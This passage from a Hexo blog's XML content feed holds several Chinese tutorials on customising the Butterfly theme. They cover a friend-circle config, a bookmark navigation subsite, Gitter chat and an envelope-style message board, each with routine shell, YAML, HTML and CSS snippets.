class="attr">apiurl:</span> <span class="string">https://hexo-friendcircle-api.vercel.app/api</span> <span class="comment">#api地址</span></span><br><span class="line">  <span class="attr">initnumber:</span> <span class="number">20</span> <span class="comment">#【可选】页面初始化展示文章数量</span></span><br><span class="line">  <span class="attr">stepnumber:</span> <span class="number">10</span> <span class="comment">#【可选】每次加载增加的篇数</span></span><br><span class="line">  <span class="attr">css:</span> <span class="comment">#【可选】开发者接口，自定义css链接</span></span><br><span class="line">  <span class="attr">js:</span> <span class="comment">#【可选】开发者接口，自定义js链接</span></span><br><span class="line">  <span class="attr">path:</span> <span class="comment">#【可选】fcircle的路径名称。默认为 fcircle，生成的页面为 fcircle/index.html</span></span><br><span class="line">  <span class="attr">front_matter:</span> <span class="comment">#【可选】fcircle页面的 front_matter 配置</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">朋友圈</span></span><br><span class="line">    <span class="attr">comments:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></li><li><p>参数释义</p></li></ol><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">备选值 / 类型</th><th style="text-align:left">释义</th></tr></thead><tbody><tr><td style="text-align:left">enable</td><td style="text-align:left">true/false</td><td style="text-align:left">控制开关</td></tr><tr><td style="text-align:left">apiurl</td><td style="text-align:left">URL</td><td style="text-align:left">api 链接，配置教程参看<a href="https://noionion.top/47095.html">友链朋友圈 3.0 食用说明书</a></td></tr><tr><td style="text-align:left">initnumber</td><td style="text-align:left">number</td><td style="text-align:left">【可选】填写阿拉伯数字，页面展示文章数量，默认 20</td></tr><tr><td style="text-align:left">stepnumber</td><td style="text-align:left">number</td><td style="text-align:left">【可选】填写阿拉伯数字，每次加载增加的篇数，默认 10</td></tr><tr><td style="text-align:left">css</td><td style="text-align:left">URL</td><td style="text-align:left">【可选】开发者接口，自定义 css 链接</td></tr><tr><td style="text-align:left">js</td><td style="text-align:left">URL</td><td style="text-align:left">【可选】开发者接口，自定义 js 链接</td></tr><tr><td style="text-align:left">path</td><td style="text-align:left">string</td><td style="text-align:left">【可选】字符串，fcircle 的路径名称。默认为 fcircle，生成的页面为 fcircle/index.html</td></tr><tr><td style="text-align:left">front_matter</td><td style="text-align:left">object</td><td style="text-align:left">【可选】写法见上文示例，fcircle 页面的 front_matter 配置</td></tr></tbody></table></div><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加百宝箱</title>
      <link href="2021/11/09/%E6%B7%BB%E5%8A%A0%E7%99%BE%E5%AE%9D%E7%AE%B1/"/>
      <url>2021/11/09/%E6%B7%BB%E5%8A%A0%E7%99%BE%E5%AE%9D%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>添加百宝箱</p><p class='p center small'>Butterfly主题魔改教程，添加百宝箱。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="http://wenchong.space/2021/07/16/navigation/">雨中的博客《hexo百宝箱搭建攻略》</a>。</p></div><h1 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h1><p>在日常生活中我们经常需要收藏许多网址书签来提升我们的办公效率，但是书签的放置，整理和分类的工作总是一言难尽，非常麻烦。因此本次将通过建立一个hexo小站来单独存储我们的所有收藏网址，也就是今天要介绍的百宝箱😛！</p><p>首先我需要说明一下，这个百宝箱的搭建你可以理解为是建立一个新的hexo网站，因此很显然他是基于一个主题搭建的，这个主题就是<a href="https://github.com/HCLonely/hexo-theme-webstack/">hexo-theme-webstack</a>。但是它区别于我们之前搭建hexo博客，因为他可以不需要再次新建一个github仓库进行部署，我们只需要本地预览生成html即可，如果你没有理解也没有关系，跟着教程一步步来就好了。</p><h1 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2.步骤"></a>2.步骤</h1><h2 id="2-1搭建教程"><a href="#2-1搭建教程" class="headerlink" title="2.1搭建教程"></a>2.1搭建教程</h2><ol><li><p>首先我们需要新建一个根目录navigation文件夹，然后进入这个文件夹进行hexo环境的初始化：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir navigation</span><br><span class="line"><span class="built_in">cd</span> navigation</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure></li><li><p>进行完hexo初始环境的搭建后，我们需要下载hexo-theme-webstack主题，输入如下指令：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> themes</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/HCLonely/hexo-theme-webstack.git</span><br></pre></td></tr></table></figure></li><li><p>下载完成后navigation下的文件应该与下图一致,如果有多余的文件删除即可。</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo/TianJiaBaiBaoXiang/P4O96[%7D00UI[UFKDVGTTCW2.png" alt=""></p></li><li><p>我们打开当前中的站点配置文件_config.yml文件，修改一下使用的主题:</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo/TianJiaBaiBaoXiang/%60B]C43H]L%7B@E7B%60[G%60A%7DB@T.png" alt=""></p></li><li><p>然后我们再在站点根目录右键点击<code>git bash here</code>打开命令窗输入<code>hexo cl &amp;&amp; hexo g&amp;&amp; heso s</code>后在端口<code>localhost://4000</code>上即可看到本地预览的效果，但是此时我们发现里面的内容还是空的，链接都没有，因为这需要我们自己添加，同时此时的个人信息还不是自己的，关于页面也还没有建立。我们需要参考<a href="https://blog.hclonely.com/posts/3cd4fb34/">官方配置文档</a>进行配置即可：</p></li></ol><h2 id="2-2魔改教程"><a href="#2-2魔改教程" class="headerlink" title="2.2魔改教程"></a>2.2魔改教程</h2><ol><li><p>去除Chinese语言选项，这个东西…没啥用，而且总是跳转到空白界面，很烦所以将它去除，我们打开<strong><code>navigation/themes/layout/index.ejs</code></strong>文件将16-27行注释掉即可：</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo/TianJiaBaiBaoXiang/20210716114155.png" alt=""></p></li><li><p>夜间模式的选择框增加白色阴影选中样式，我们还是在<strong><code>navigation/themes/webstack/source/css/hclonely.css</code></strong>中加入如下代码：</p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span><span class="selector-class">.night</span> <span class="selector-class">.box2</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">26px</span> <span class="number">40px</span> -<span class="number">24px</span> <span class="built_in">rgb</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">  -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">26px</span> <span class="number">40px</span> -<span class="number">24px</span> <span class="built_in">rgba</span>(<span class="number">130</span>, <span class="number">130</span>, <span class="number">130</span>, <span class="number">0.13</span>);</span><br><span class="line">  -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">26px</span> <span class="number">40px</span> -<span class="number">24px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">36</span>, <span class="number">100</span>, <span class="number">0.3</span>);</span><br><span class="line">  -webkit-<span class="attribute">transition</span>: all <span class="number">0.3s</span> <span class="built_in">cubic-bezier</span>(<span class="number">0.25</span>, <span class="number">0.1</span>, <span class="number">0.14</span>, <span class="number">1.43</span>);</span><br><span class="line">  -moz-<span class="attribute">transition</span>: all <span class="number">0.3s</span> ease;</span><br><span class="line">  -o-<span class="attribute">transition</span>: all <span class="number">0.3s</span> ease;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.3s</span> ease-out;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#232323</span> <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-3部署教程"><a href="#2-3部署教程" class="headerlink" title="2.3部署教程"></a>2.3部署教程</h2><ol><li><p>那么大体上我们已经把百宝箱小站开发的差不多了，现在我们需要将它部署到我们的博客网站上啦，这里有两种方法：①.新建一个github仓库来存储部署并且使用一个二级域名来解析指向即可但是很麻烦；②.以分站的形式来建立百宝箱子页；</p><p> 我就在以更简单直接的方法介绍一下我们怎样将navigation部署为博客的一个子页，我们首先需要修改navigation文件夹下的_config.yml文件中的如下内容,我们需要将url和root改为:</p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">url:</span> <span class="string">&lt;你的博客域名&gt;/navigation</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/navigation</span></span><br></pre></td></tr></table></figure></li><li><p>然后要注意最下方的deploy不需要填写仓库地址或者ip地址，因为我们并不是将它作为另一个新网站重新部署。我们直接在navigation下打开命令窗输入以下指令：</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo cl</span><br><span class="line">hexo g</span><br><span class="line">hexo s//本地预览一下生成的页面是否正常</span><br></pre></td></tr></table></figure></li><li><p>当本地预览没有任何问题后，我们打开navigation下的public文件夹，这个文件夹存储的是生成的html文件，我们将public文件夹下的所有文件复制：</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo/TianJiaBaiBaoXiang/20210716140845.png" alt=""></p></li><li><p>然后我们打开自己的博客站点文件夹，我这里是<code>myblog</code>（名字可能不同），然后在博客站点文件夹下进入source文件夹并创建一个新的文件夹navigation:</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo/TianJiaBaiBaoXiang/20210716142711.png" alt=""></p></li><li><p>然后进入这个navigation文件夹将刚刚复制的文件拷贝过来即可。然后我们再打开博客站点文件夹下的_config.yml文件，在如下地方加入<code>- &quot;navigation/**&quot;</code>。意思是hexo博客渲染生成页面时这个文件夹下的内容跳过渲染显示：</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo/TianJiaBaiBaoXiang/20210716142110.png" alt=""></p></li><li><p>此时我们运行博客本地预览，重新生成博客页面</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g</span><br></pre></td></tr></table></figure></li><li><p>输入<code>hexo s</code>打开本地博客预览后输入地址<code>http://localhost:4000/navigation/</code> 即可看到百宝箱已经加入成功：</p><p> <img src= "/img/loading.gif" data-lazy-src="https://unpkg.zhimg.com/qianchengnpm-blogassetsrepo/TianJiaBaiBaoXiang/20210716141648.png" alt=""></p></li><li><p>接下来我们只需要为自己的博客顶栏添加一个新的图标链接指向这个子页即可了。最后在博客站点下重新部署即可将导航栏百宝箱部署线上！</p></li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加在线聊天</title>
      <link href="2021/11/08/%E6%B7%BB%E5%8A%A0%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9/"/>
      <url>2021/11/08/%E6%B7%BB%E5%8A%A0%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>添加在线聊天</p><p class='p center small'>Butterfly主题魔改教程，添加在线聊天。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://butterfly.js.org/posts/ceeb73f/#%E5%9C%A8%E7%B6%AB%E8%81%8A%E5%A4%A9">butterfly主题官方教程的《Butterfly 安裝文檔(四) 主題配置-2》的在线聊天章节</a>。</p></div><h1 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h1><div class="tip warning"><p>从3.0开始，<a href="https://butterfly.js.org/">butterfly主题</a>内置了多种在线聊天工具。你可以选择开启一种，方便你与访客的交流。</p><p>本博客采用的是Gitter在线聊天工具，正好与GitHub组成一套。</p></div><h1 id="2-步骤"><a href="#2-步骤" class="headerlink" title="2.步骤"></a>2.步骤</h1><ol><li><p>打开<a href="https://gitter.im/">Gitter註册账号并登录</a>(可以使用GitHub账号登录)</p></li><li><p>创建一个<strong><code>community</code></strong>或者<strong><code>room</code></strong>,复製名称到设置去</p><p> <img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-docs-chat-gitter-setting.png" alt=""></p></li><li><p>修改 <strong><code>主题配置文件</code></strong></p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gitter</span></span><br><span class="line"><span class="comment"># https://gitter.im/</span></span><br><span class="line"><span class="attr">gitter:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">room:</span> <span class="comment">#填写你创建的community或者room名称</span></span><br></pre></td></tr></table></figure></li><li><p>效果图</p><p> <img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-docs-chat-gitter-ui.png" alt="Gitter效果图"></p></li></ol><h1 id="3-其他选择"><a href="#3-其他选择" class="headerlink" title="3.其他选择"></a>3.其他选择</h1><p>本博客为了方便选择了Gitter在线聊天工具，界面简洁但是不太美观。如果想要好看的话，推荐选择tidio在线聊天工具。它可以自行配置样式，如图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-docs-chat-tidio-setting.png" alt="自行配置样式"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-docs-chat-tidio-demo.png" alt="效果图"></p><p>如果想看更多选择请参考<a href="https://butterfly.js.org/">butterfly主题</a>官方文档。</p><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
          <category> 魔改教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
            <tag> 魔改教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加留言板</title>
      <link href="2021/11/08/%E6%B7%BB%E5%8A%A0%E7%95%99%E8%A8%80%E6%9D%BF/"/>
      <url>2021/11/08/%E6%B7%BB%E5%8A%A0%E7%95%99%E8%A8%80%E6%9D%BF/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>添加留言板</p><p class='p center small'>Butterfly主题魔改教程，添加留言板。</p><p><br/></p><div class="tip home"><p>我的博客主题版本为：hexo5.4、Butterfly3.6.2</p><p>如果与我的版本不一样可能会有略微差别，届时请自行百度。</p><p>本文参考文章：<a href="https://akilar.top/posts/e2d3c450/">Akilarの糖果屋的《信笺样式留言板》</a>。</p></div><h1 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h1><p>此篇文章为了记录博客魔改过程，方便找到回家的路。参考<a href="https://akilar.top/posts/e2d3c450/">Akilarの糖果屋的《信笺样式留言板》</a></p><p>教程，为了方便以后的升级与自定义，本文只记录插件化魔改和旧版markdown魔改方案，减少像源码魔改方案的侵入性。</p><h1 id="2-npm插件魔改-推荐"><a href="#2-npm插件魔改-推荐" class="headerlink" title="2.npm插件魔改(推荐)"></a>2.npm插件魔改(推荐)</h1><ol><li><p>在 <code>[Blogroot]</code> 运行指令</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-butterfly-envelope --save</span><br></pre></td></tr></table></figure></li><li><p>在站点配置文件或者主题配置文件添加配置项（对，两者任一均可。但不要都写）</p> <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># envelope_comment</span></span><br><span class="line"><span class="comment"># see https://akilar.top/posts/58900a8/</span></span><br><span class="line"><span class="attr">envelope_comment:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span> <span class="comment">#开关</span></span><br><span class="line">  <span class="attr">cover:</span> <span class="string">https://ae01.alicdn.com/kf/U5bb04af32be544c4b41206d9a42fcacfd.jpg</span> <span class="comment">#信笺封面图</span></span><br><span class="line">  <span class="attr">message:</span> <span class="comment">#信笺内容，支持多行</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想问的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想说的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">有什么想吐槽的？</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哪怕是有什么想吃的，都可以告诉我哦~</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="string">自动书记人偶竭诚为您服务！</span> <span class="comment">#信笺结束语，只能单行</span></span><br><span class="line">  <span class="attr">height:</span> <span class="comment">#调整信笺划出高度，默认1050px</span></span><br><span class="line">  <span class="attr">path:</span> <span class="comment">#【可选】comments 的路径名称。默认为 comments，生成的页面为 comments/index.html</span></span><br><span class="line">  <span class="attr">front_matter:</span> <span class="comment">#【可选】comments页面的 front_matter 配置</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">留言板</span></span><br><span class="line">    <span class="attr">comments:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="3-旧版markdown魔改（不推荐）"><a href="#3-旧版markdown魔改（不推荐）" class="headerlink" title="3.旧版markdown魔改（不推荐）"></a>3.旧版markdown魔改（不推荐）</h1><div class="tip warning"><p>此方案为旧版方案，代码结构较为混乱，且与 fancybox、medium_zoom 之间存在较多兼容性 bug，不推荐使用。</p></div><ol><li><p>新建留言板页面（已有的不用重复操作。）<br> 在 <code>[Blogroot]</code> 打开终端，输入</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page comments</span><br></pre></td></tr></table></figure></li><li><p>打开 <code>[Blogroot]\source\comments\index.md</code><br> 将其内容修改为：</p> <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 留言板</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">---</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/css/commentsbar.css&quot;</span>/&gt;</span></span></span></span><br><span class="line"><span class="emphasis">  <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;computer&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">    <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;maincontent&quot;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">      <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;form-wrap&quot;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/Akilarlxh/Valine-Admin@v1.0/source/img/before.png&quot;</span> <span class="attr">id</span>=<span class="string">&quot;beforeimg&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">        <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;envelope&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">          <span class="xml"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">            <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;formmain&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">              <span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;headerimg&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://ae01.alicdn.com/kf/U5bb04af32be544c4b41206d9a42fcacfd.jpg&quot;</span>/&gt;</span></span></span></span><br><span class="line"><span class="emphasis">              <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;padding: 5px 20px;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                <span class="xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                  <span class="xml"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">calss</span>=<span class="string">&quot;title3&quot;</span>&gt;</span></span>来自Akilar的留言:<span class="xml"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                <span class="xml"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                <span class="xml"><span class="tag">&lt;<span class="name">center</span> <span class="attr">class</span>=<span class="string">&quot;comments&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                  有什么想问的？<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                  有什么想说的？<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                  有什么想吐槽的？<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                  哪怕是有什么想吃的，都可以告诉我哦~<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                <span class="xml"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bottomcontent&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                <span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;bottomimg&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://ae01.alicdn.com/kf/U0968ee80fd5c4f05a02bdda9709b041eE.png&quot;</span>/&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">                <span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;bottomhr&quot;</span>&gt;</span></span>自动书记人偶竭诚为您服务！<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">              <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">            <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">          <span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">        <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;afterimg&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/Akilarlxh/Valine-Admin@v1.0/source/img/after.png&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">      <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">    <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">  <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">  <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;mobile&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">    <span class="xml"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">      <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;formmain&quot;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;headerimg&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://ae01.alicdn.com/kf/U5bb04af32be544c4b41206d9a42fcacfd.jpg&quot;</span> /&gt;</span></span></span></span><br><span class="line"><span class="emphasis">        <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;padding: 5px 20px;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">          <span class="xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">            <span class="xml"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;title3&quot;</span>&gt;</span></span>来自Akilar的留言:<span class="xml"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">          <span class="xml"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">          <span class="xml"><span class="tag">&lt;<span class="name">center</span> <span class="attr">class</span>=<span class="string">&quot;comments&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">            有什么想问的？<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">            有什么想说的？<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">            有什么想吐槽的？<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">            哪怕是有什么想吃的，都可以告诉我哦~<span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">          <span class="xml"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">          <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bottomcontent&quot;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://ae01.alicdn.com/kf/U0968ee80fd5c4f05a02bdda9709b041eE.png&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bottomhr&quot;</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">          <span class="xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;bottomhr&quot;</span>&quot;&gt;</span></span>自动书记人偶竭诚为您服务！<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">        <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">      <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">    <span class="xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span></span><br><span class="line"><span class="emphasis">  <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure></li><li><p>在 <code>[Blogroot]\themes\butterfly\source\css\</code> 目录下新建 <code>commentsbar.css</code></p> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 滚动条隐藏 */</span></span><br><span class="line">::-webkit-scrollbar &#123;</span><br><span class="line">  display: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 禁用图片点击,butterfly渲染后会给图片套上fancybox，点开后会造成信笺偏移*/</span></span><br><span class="line"><span class="selector-class">.formmain</span>&#123;</span><br><span class="line">   <span class="attribute">pointer-events</span>: none <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* top-img隐藏 */</span></span><br><span class="line"><span class="selector-id">#page-header</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: transparent <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 宽度小于530px隐藏信封 */</span></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">530px</span>) &#123;</span><br><span class="line">  <span class="selector-id">#computer</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">530px</span>) &#123;</span><br><span class="line">  <span class="selector-id">#mobile</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: none <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#article-container</span> <span 